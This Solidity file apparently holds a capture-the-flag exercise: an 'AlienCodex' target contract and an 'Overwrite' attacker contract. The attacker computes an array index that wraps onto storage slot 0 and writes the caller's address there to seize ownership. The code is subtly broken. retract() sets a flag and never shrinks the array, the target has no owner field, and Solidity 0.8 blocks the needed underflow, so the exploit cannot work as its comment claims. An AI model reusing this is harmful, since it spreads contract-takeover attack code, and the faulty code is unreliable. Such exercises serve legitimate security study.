// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AlienCodex {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    contact = true;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}


contract Overwrite {
    AlienCodex target;
    constructor(address _target) {
        target = AlienCodex(_target);
    }

    function exploit() public {
        target.makeContact();
        // We want the very last index (2**256 - 1) and +1
        uint256 index = ((2 ** 256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        target.retract();
        bytes32 newOwner = bytes32(uint256(uint160(msg.sender)));
        target.revise(index, newOwner);
    }
}